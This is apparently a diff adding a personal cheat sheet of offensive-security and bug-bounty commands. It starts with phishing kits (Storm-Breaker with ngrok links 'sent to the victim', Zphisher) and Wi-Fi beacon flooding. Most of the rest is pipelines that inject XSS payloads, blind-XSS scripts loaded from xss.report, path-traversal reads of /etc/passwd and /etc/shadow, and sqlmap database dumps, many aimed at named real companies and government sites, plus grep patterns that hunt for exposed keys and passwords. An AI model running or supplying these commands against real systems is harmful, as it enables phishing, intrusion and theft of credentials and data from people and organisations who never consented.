@@ -1,0 +1,509 @@
+all using commands will describe here
+
+
+storm-Breaker too
+cd storm-breaker -> sudo python st.py ->open link in browser (http://localhost:2525)
+cd download -> ./ngrok http 2525
+merge both link and sent to the victim 
+
+=======================================================================================================================
+
+ifconfig
+airmon-ng start wlan0
+
+[
+sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
+]
+
+sudo mdk3 wlan0mon b -c 1 -f /path/to/your/list.txt
+
+sudo airmon-ng stop wlan0mon
+
+
+
+
+====================================================================================================================================
+
+SMUGLER tool
+python3 smuggler.py -u <URL>      ##       cat list_of_hosts.txt | python3 smuggler.py
+
+==================================================================================================================
+
+ZPHISHER tool 
+cd desktop  -> cd zphisher -> bash zphisher.sh -> start
+
+========================================================================================================================
+
+pwnxss tool
+python pwnxss.py -u http://testphp.vulnweb.com/ 
+
+=============================================================================================================================
+1. sudo apt-get update
+2. wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
+3. sudo tar -xvf go1.21.0.linux-amd64.tar.gz
+4. sudo mv go /usr/local
+5. export GOROOT=/usr/local/go
+6. export GOPATH=$HOME/go
+7. export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+8. source ~/.profile
+
+
+sudo echo 'export GOPATH=$HOME/go' >> ~/.bashrc
+sudo echo 'export PATH=$GOPATH/bin:$GOROOT/bin:$PATH' >> ~/.bashrc
+
+====================================================================================================================================
+
+ssrfmap
+python3 ssrfmap.py -r /home/as.txt -m readfile -p "parameter"
+
+=======================================================================================================================================
+
+Reconftr
+cd reconftw/
+./install.sh
+./reconftw.sh -d target.com -r
+
+
+===============================================================================================================================================
+
+curl -S -D - https://www.mindbodyonline.com/.js?test
+curl -X PURGE https://www.mindbodyonline.com/.js?test
+
+
+============================================================================================================================
+
+
+xss automation with kxss tool
+subfinder -d hoseasons.co.uk -o subfinder-subdomains.txt
+cat dvai.txt | assetfinder -subs-only >> subfinder-subdomains.txt
+sort -u subfinder-subdomains.txt -o sorted-subdomains.txt
+cat subdomains.txt | httpx -mc 200 -o live-urls.txt
+for url in $(cat live-urls.txt); do python3 paramspider.py -d "$url"; done kxss -o xss-results.txt < live-urls.txt
+
+cat wayback.txt | wc -l
+
+
+=================================================================================================================================================
+
+#secretfinder
+information desclousre
+subfinder -d pexels.com| httpx | tee subdomain.txt
+cat subdomain.txt | waybackurls | tee wayback.txt
+cat wayback.txt | grep '.js' > js.txt
+cat js.txt | httpx -mc 200 | tee live.txt
+
+nuclei -l live.txt -t /root/nuclei-templates/http/exposures
+
+
+======================================================================================================================================================
+
+#secretfinder
+cat live.txt | while read url; do python3 /root/SecretFider/SecretFider.py -i $url -o cli >> secret.txt; done
+
+
+==============================================================================================================================================
+#install go lang 1.21
+
+1. sudo apt-get update
+2. wget https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
+3. sudo tar -xvf go1.21.0.linux-amd64.tar.gz
+4. sudo mv go /usr/local
+5. export GOROOT=/usr/local/go
+6. export GOPATH=$HOME/go
+7. export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+8. source ~/.profile
+
+chmod +x setup_go.sh
+./setup_go.sh
+
+==================================================================================================================
+
+subfinder -d make.com | httpx | gau | uro | gf lfi | tee target.txt
+nuclei -list target.txt -tags lfi
+
+
+toxicache -i subdomain.txt
+ paramspider -d example.com -p '"/><svg onload=prompt(document.domain)>'
+
+
+
+================================================================================================================
+
+spider.txt   wayback.txt
+
+cat spider.txt wayback.txt | short -u testing.txt
+
+======================================================================================================================================================================================
+
+automation xss
+
+subfinder -d make.com | waybackurls > wayback.txt 
+
+cat wayback.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(123)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(123)" && echo "$host \033{0;31mVulnerable\n";done
+
+
+cat wayback.txt | gf xss | grep '=fuzz' | qsreplace '="><script>confirm(123)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(123)" && echo "$host \033{0;31mVulnerable\n";done
+
+
+https://www.teramind.co/
+echo "wetransfer.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew | qsreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' -vuln
+
+echo "hubspot.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew  | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' -vuln
+
+echo "testphp.vulnweb.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
+
+
+FOR AUTOMATION XSS BY LOST
+
+waybackurls target.com >> wayck.txt
+cat wayback | gf xss | sed 's/=.*/=/' 
+cat wayback | gf xss | sed 's/=.*/=/' | dalfox pipe
+===================================================================================================================================================================================
+
+# shodanx
+shodanx domain -d hoseasons.co.uk
+
+===================================================================================================================================================================================
+
+OPEN REDIRECT
+
+cat spider.txt | openredirectx -k "fuzz"
+
+└─# cat /root/bugbounty/moonpig/results/moonpig.com.txt | python3 /root/openredirex/openredirex.py -k "FUZZ" 
+
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@2
+for finding secretdes
+
+./subdomainer -t rollbar.com -f true
+
+COMMAND: cat all.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt ; cat allUrls.txt | httpx -mc 200,403 -o liveallurls.txt
+
+nuclei -t /root/nuclei-templates/ -l all-live.txt -es info -o nucleiall.txt
+
+
+==========================================================================================
+
+http smugging
+
+python3 smuggler.py -u https://www.hoseasons.co.uk
+
+
+python3 cloudfail.py --target odpbusiness.com
+==================================================================================================
+for LFI 
+
+subfinder -d gnpd.com | httpx | gau | uro | gf lfi | tee target.txt 
+cat target.txt
+nuclei -list target.txt -tags lfi
+
+
+echo 'url' | gau | uro | gf lfi
+nuclei -target 'url' -tags lfi
+
+
+dotdotpwd -m http-url -d 10   -f /etc/passwd -u "url=TRAVERSAL" -b -k "root:"
+
+
+subfinder -d viator.com | httpx | gau | uro | gf lfi | qsreplace "/ect/passwd" | while read url ; do curl -silent "$url" | grep "root:x:" && echo "$url is vulnerable"; done;
+
+
+echo 'https://datacalls.fnf.com/' | qsreplace "/ect/passwd" | while read url ; do curl -silent "$url" | grep "root:x:" && echo "$url is vulnerable"; done;
+
+
+subdinder -d target.com
+put in this 
+dotdotpwd -m http-url -d 10   -f /etc/passwd -u "url=TRAVERSAL" -b -k "root:"
+
+
+dotdotpwd -m http-url -d 10   -f /etc/shadow -u "url=TRAVERSAL" -b -k "admin" 
+
+dotdotpwd -m http-url -d 10   -f /etc/shadow -u "https://www.solutionpartners.fnf.com/CMSMessages/Error.aspx?aspxerrorpath=pp=TRAVERSAL" -b -k "admin" 
+
+use gf lfi
+
+
+
+=================================================================================================================================
+
+for finding ips
+
+uncover -q "zuora.com" -e censys,fofa,shodan,shodan-idb | httpx | tee ips.txt 
+cat ips.txt
+
+
+==================================================================================================================================
+
+cat urls.txt grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token_secret"
+
+subfinder -d target.com -o subdomain.txt
+httpx -l subdomain.txt -o live.txt
+cat live.txt | waybackurls >> urls.txt
+cat live.txt | getallurls >> urls.txt
+cat live.txt | gau >> urls.txt
+duplicut urls.txt -o unique_urls.txt
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+echo "testphp.vulnweb.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe
+
+echo "mindbodyonline.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
+
+subfinder -d testphp.vulnweb.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/akshay18></script>' -parameters
+
+subfinder -d mindbodyonline.com | gau | bxss -payload '"><script src=https://xss.report/c/akshay18></script>' -header "X-Forwarded-For"
+
+echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
+
+echo "autoscout24.ch" |  katana -passive -pss waybackarchive,commoncrawl,alienvault -f qurl | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe
+
+==============================================================================================================================================================
+
+mkdir circlelytics
+cd /target
+
+subfinder -d canva.com >> subdomain.txt
+
+//cat subdomain.txt | httpx -sc -td -ip
+
+//duplicut subdomain.txt -o unique_sub.txt
+cat subdomain.txt | anew > unique_sub.txt
+
+httpx -l subdomain.txt -o unique_sub_live.txt
+
+cat unique_sub_live.txt | waybackurls >> urls.txt
+//cat unique_sub_live.txt | getallurls >> urls.txt
+cat unique_sub_live.txt | gau >> urls.txt
+
+//duplicut urls.txt -o unique_urls.txt
+cat urls.txt | anew > unique_urls.txt
+
+
+paramspider -l unique_sub_live.txt
+
+
+# shodanx
+shodanx domain -d kick.com
+
+
+//#secretfinder
+//cat live.txt | while read url; do python3 /root/SecretFider/SecretFider.py -i $url -o cli >> secret.txt; done
+
+grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" /path/to/directory/*.js
+
+
+
+
+subfinder -d domain.com | httpx -mc 200 | tee subdomains.txt 
+
+cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
+
+
+Now you can grep for this : cat js.txt | grep -r -E “aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret”
+
+#cache_checking
+toxicache -i unique_sub_live.txt
+
+#http smugging (cd smuggler)
+python3 smuggler.py -u urls
+
+#OPEN REDIRECT
+X cat spider.txt | openredirectx -k "fuzz"
+\/ cat /root/bugbounty/moonpig/results/moonpig.com.txt | python3 /root/openredirex/openredirex.py -k "FUZZ" 
+
+
+#LFI(automation and also try manual on this urls)
+cat unique_urls.txt | gau | uro | gf lfi | tee lfi.txt 
+nuclei -list target.txt -tags lfi
+
+dotdotpwd -m http-url -d 10   -f /etc/passwd -u "url=TRAVERSAL" -b -k "root:"
+dotdotpwd -m http-url -d 10   -f /etc/shadow -u "url=TRAVERSAL" -b -k "admin" 
+perl dotdotpwn.pl -m http-url -d 10 -f /etc/passwd -u "http://forum.webflow.com:80/t/vertical-alignment/9859?page=TRAVERSAL" -b -k "root:"
+
+
+#xss(automation and also try manual on this urls)
+
+for url in $(</path/unique_sub_live.txt); do (python3 paramspider.py -d "${url}"); done > filtered_url.txt 
+cat results/forum.webflow.com.txt  | kxss > xss-results.txt
+
+
+cat unique_urls.txt | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew  | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' -vuln
+
+"/><svg onload=prompt(document.domain)>
+
+
+
+└─# echo "fbr.gov.pk" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew | qsreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' -vuln 
+
+
+cat unique_sub_live.txt | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
+
+
+cat urls.txt | gf xss | sed 's/=.*/=/' > gf_xxs.txt
+cat gf_xxs.txt | anew > unique_gf_xxs.txt
+cat unique_urls.txt | sed 's/=.*/=\/>"\/><svg onload=prompt(document.domain)>"/' > filt_xss.txt
+cat filt_xss.txt | httpx -sc 200 > xss_200_ok.txt
+
+
+
+# web 
+http.favicon.hash:904561386
+http.favicon.hash:[Favicon hash here]
+# command-line 
+shodan search org:"Target" http.favicon.hash:<hash>--fields ip_str,port --separator " " | awk '{print $1":"$2}'
+shodan search org:"Target" http.favicon.hash:116323821 --fields ip_str,port --separator " " | awk '{print $1":"$2}'
+https://medium.com/@Asm0d3us/weaponizing-favicon-ico-for-bugbounties-osint-and-what-not-ace3c214e139
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+katana -u vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+subfinder -d domain.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
+
+waybackurls “site.com” | grep -Eo ‘https?://[^/]+/[^”]+\.js’ | sed ‘s|^https\?://[^/]\+/||’ | awk -F ‘/’ ‘{print $NF}’
+
+curl -s https://app.site.com/config.js | \
+grep -E “environment: ‘Production’|storageUrl: ‘https://buildxact.blob.core.windows.net/'|googleApiKey: ‘|appInsightsInstrumentationKey: ‘|globalApiEndpoint: ‘|streamChatApiKey: ‘|auth0ClientId: ‘|auth0Domain: ‘|flatfileApiKey: ‘|webSpellCheckerServiceId: ‘|webSpellCheckerServiceUrl: ‘|clientPortalUrl: ‘|appVersion: ‘|appVersionDate: ‘|appDomainUrl: ‘|oneBuildKey: ‘|flatfilePlatformPublishableKey: ‘|flatfilePlatformEnvironmentId: ‘“ | \
+sed “s/.*’\(.*\)’.*/\1/”
+
+
+
+wpscan
+------->
+
+wpscan --url https://devedutech.com/ --enumarate ap
+
+wpscan --url http://target.com --enumarate at
+ 
+wpscan --url http://target.com --enumarate vp 
+
+wpscan --url http://target.com   (bydefult it apply all type scans)
+
+
+cmsmap 
+
+joomla
+joomscan -u
+
+
+
+python3 hash-id.py -hash--
+
+
+
+
+inurl:nab.com.au | confidential | “employee only” | proprietary | top secret | classified | trade secret | internal | private | WS_FTP | ws_ftp | log | LOG filetype:log
+
+
+
+
+
+
+
+
+
+
+
+===========================================================================================================
+
+mkdir target
+cd /target
+
+subfinder -d target.com >> subdomains.txt 
+
+cat subdomains.txt | httpx -favicon | tee -a file.txt
+http.favicon.hash:[Favicon hash here]
+shodan search org:"Target" http.favicon.hash:<hash>--fields ip_str,port --separator " " | awk '{print $1":"$2}'
+
+httpx -l subdomains.txt -o unique_sub_live.txt
+
+subzy run --targets unique_sub_live.txt --concurrency 100 --hide_fails --verify_ssl | tee subzy.txt
+
+paramspider -d target.com
+paramspider -l unique_sub_live.txt
+
+cat unique_sub_live.txt | waybackurls >> urls.txt
+cat unique_sub_live.txt | gau >> urls.txt
+
+cat urls.txt | anew > unique_urls.txt
+
+
+cat unique_urls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config" >> important_uls.txt
+
+
+cat unique_urls.txt | grep .js | tee js.txt
+
+cat js.txt | grep -r -E “aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret” >> important_uls.txt
+
+#hash identifire
+python3 hash-id.py -hash--
+
+#cache_checking
+toxicache -i unique_sub_live.txt
+
+#http smugging (cd smuggler)
+python3 /root/smuggler/smuggler.py -u urls
+
+#OPEN REDIRECT
+cat spider.txt | openredirectx -k "fuzz"
+cat /root/bugbounty/moonpig/results/moonpig.com.txt | python3 /root/openredirex/openredirex.py -k "FUZZ" 
+
+cat unique_urls.txt | gf lfi | nuclei -tags lfi
+cat unique_urls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
+cat unique_urls.txt | gf sql >> sql.txt
+cat unique_urls.txt | uro | gf lfi | tee lfi.txt
+
+#LFI(automation and also try manual on this urls)
+nuclei -list target.txt -tags lfi
+
+dotdotpwd -m http-url -d 10   -f /etc/passwd -u "url=TRAVERSAL" -b -k "root:"
+dotdotpwd -m http-url -d 10   -f /etc/shadow -u "url=TRAVERSAL" -b -k "admin" 
+perl dotdotpwn.pl -m http-url -d 10 -f /etc/passwd -u "http://forum.webflow.com:80/t/vertical-alignment/9859?page=TRAVERSAL" -b -k "root:"
+
+#BSQLi
+python3 /root/BSQLi/lostsec.py -l sql.txt -p payloads/xor.txt -t 5
+
+#xss(automation and also try manual on this urls)
+for url in $(</path/unique_sub_live.txt); do (python3 paramspider.py -d "${url}"); done > filtered_url.txt 
+cat results/forum.webflow.com.txt  | kxss > xss-results.txt
+
+cat unique_urls.txt | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew | qsreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' -vuln 
+
+cat unique_urls.txt | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
+
+subfinder -d target.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/akshay18></script>' -parameters
+
+
+subfinder -d target.com -alles -stil | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --niveau 5 --random-agent | tee -a sqli.txt
+
+
+
+/bugbounty
+chmod +x bugbounty_script.sh
+./bugbounty_script.sh target.com
+
+---------------------------------
+http://wwweightfive.officedepot.com:80/specialLinks.do?file=
+python3 lostsec.py -u "https://shub.safaricom.co.ke/OA_HTML/OA.jsp?page=" -p payloads/xor.txt -t 5
+
+
+BEST SQLI METHODLOGY BY COFFIN:
+for single url:
+python3 lostsec.py -u "http://testphp.vulnweb.com/artists.php?artist=" -p payloads/xor.txt -t 5
+
+for multiple urls:
+paramspider -d testphp.vulnweb.com -o urls.txt
+cat output/urls.txt | sed 's/FUZZ//g' >final.txt
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+echo testphp.vulnweb.com | gau --mc 200 | urldedupe >urls.txt
+cat sqli_urls.txt | grep -E ".php|.asp|.aspx|.cfm|.jsp" | grep '=' | sort > output.txt
+cat output.txt | sed 's/=.*/=/' >final.txt
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
+echo testphp.vulnweb.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
+katana -u http://testphp.vulnweb.com -d 5 | grep '=' | urldedupe | anew output.txt
+cat output.txt | sed 's/=.*/=/' >final.txt
+python3 lostsec.py -l final.txt -p payloads/xor.txt -t 5
